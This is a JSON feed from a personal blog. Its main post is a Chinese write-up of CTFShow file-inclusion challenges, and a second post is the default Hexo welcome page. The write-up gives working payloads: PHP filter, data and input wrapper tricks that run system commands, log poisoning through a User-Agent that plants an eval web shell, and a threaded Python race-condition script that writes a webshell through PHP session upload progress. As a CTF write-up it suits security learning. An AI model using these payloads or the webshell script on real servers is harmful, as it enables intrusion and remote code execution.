{
    "version": "https://jsonfeed.org/version/1",
    "title": "自由之翼",
    "subtitle": "",
    "icon": "https://zzk6th.github.io/assets/favicon.ico",
    "description": "你猜?",
    "home_page_url": "https://zzk6th.github.io",
    "items": [
        {
            "id": "https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "CTF Show文件包含",
            "date_published": "2024-02-29T07:20:46.188Z",
            "content_html": "<h1 id=\"Web78\"><a href=\"#Web78\" class=\"headerlink\" title=\"Web78\"></a>Web78</h1><p>用php伪协议绕过  </p>\n<blockquote>\n<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  </p>\n</blockquote>\n<h1 id=\"web79\"><a href=\"#web79\" class=\"headerlink\" title=\"web79\"></a>web79</h1><p>用date伪协议绕过</p>\n<blockquote>\n<p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;<br>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; system(‘tac flag.p*p’);?&gt;  </p>\n</blockquote>\n<p>或者用input 大写php绕过  </p>\n<blockquote>\n<p>?file&#x3D;Php:&#x2F;&#x2F;input<br>post：&lt;?php system(‘ls’);?&gt;  </p>\n</blockquote>\n<h1 id=\"Web80\"><a href=\"#Web80\" class=\"headerlink\" title=\"Web80\"></a>Web80</h1><p>上题中input的php大写绕过jie还能用<br><img data-src=\"/../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_2.png\" alt=\"Image-1\"><br>php和data伪协议都用不了了, 可以包含日志文件<br>通过Wappalyzer得知中间件是Nginx  </p>\n<blockquote>\n<p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>User-Agent: &lt;?php echo 123;phpinfo();eval($_POST[0]);?&gt;  </p>\n</blockquote>\n<p><em>直接连接蚁剑拿到flag</em>  </p>\n<h1 id=\"web81\"><a href=\"#web81\" class=\"headerlink\" title=\"web81\"></a>web81</h1><p>与上一题一样<br>传参</p>\n<blockquote>\n<p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  </p>\n</blockquote>\n<p>再改</p>\n<blockquote>\n<p>User-Agent: &lt;?php system(‘ls’);?&gt;  </p>\n</blockquote>\n<p>回车两次，得到  </p>\n<blockquote>\n<p>fl0g.php index.php  </p>\n</blockquote>\n<p>然后再改</p>\n<blockquote>\n<p>User-Agent: &lt;?php system(‘tac fl0g.p*p’);?&gt;  </p>\n</blockquote>\n<p>回车两次，得到最终flag<br><img data-src=\"/../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_3.png\" alt=\"Image-2\">  </p>\n<h1 id=\"Web82-Web86\"><a href=\"#Web82-Web86\" class=\"headerlink\" title=\"Web82~Web86\"></a>Web82~Web86</h1><pre><code>import requests\nimport io\nimport threading\n \n \nurl=&#39;http://b04c7980-d374-4c39-9ebc-a612708262c8.challenge.ctf.show/&#39;\nsessionid=&#39;ctfshow&#39;\ndata=&#123;\n&quot;1&quot;:&quot;file_put_contents(&#39;/var/www/html/muma.php&#39;,&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);&quot;\n&#125; \n \n&#39;&#39;&#39;\npost 传递内容可在网站目录下写入一句话木马。\n根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。\nsessionid 可控，所以这里即 /tmp/sess_ctfshow。\n这样一旦访问成功，就说明木马植入了\n&#39;&#39;&#39;\n \n \n# /tmp/sess_sessionid 中写入一句话木马。\ndef write(session): \nfileBytes = io.BytesIO(b&#39;a&#39;*1024*50)\nwhile True:\nresponse=session.post(\nurl,\ndata=&#123;\n&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?php eval($_POST[1]);?&gt;&#39;\n&#125;,\ncookies=&#123;\n&#39;PHPSESSID&#39;:sessionid\n&#125;,\nfiles=&#123;\n&#39;file&#39;:(&#39;ctfshow.jpg&#39;,fileBytes)\n&#125;\n)\n \n \n# 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。\ndef read(session):\nwhile True:\nresponse=session.post(\nurl+&#39;?file=/tmp/sess_&#39;+sessionid,\n    data=data,\ncookies=&#123;\n&#39;PHPSESSID&#39;:sessionid\n&#125;\n)\n# 访问木马文件，如果访问到了就代表竞争成功\nresposne2=session.get(url+&#39;muma.php&#39;)\nif resposne2.status_code==200:\nprint(&#39;++++++done++++++&#39;)\nelse:\nprint(resposne2.status_code)\n \nif __name__ == &#39;__main__&#39;:\n \nevnet=threading.Event()\n# 写入和访问分别设置 5 个线程。\nwith requests.session() as session:\nfor i in range(5):\nthreading.Thread(target=write,args=(session,)).start()\nfor i in range(5):\nthreading.Thread(target=read,args=(session,)).start()\n \nevnet.set()\n \n</code></pre>\n<p>运行脚本并成功写入后即可访问木马。<img data-src=\"/../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_4.png\" alt=\"Image-3\"><br><img data-src=\"/../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_5.png\" alt=\"Image-4\">  </p>\n<h1 id=\"Web87-未完待续\"><a href=\"#Web87-未完待续\" class=\"headerlink\" title=\"Web87(未完待续)\"></a>Web87(未完待续)</h1>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://zzk6th.github.io/hello-world/",
            "url": "https://zzk6th.github.io/hello-world/",
            "title": "Hello World",
            "date_published": "2024-01-27T11:25:42.668Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><pre><code class=\"bash\">$ hexo new &quot;My New Post&quot;\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><pre><code class=\"bash\">$ hexo server\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><pre><code class=\"bash\">$ hexo generate\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><pre><code class=\"bash\">$ hexo deploy\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}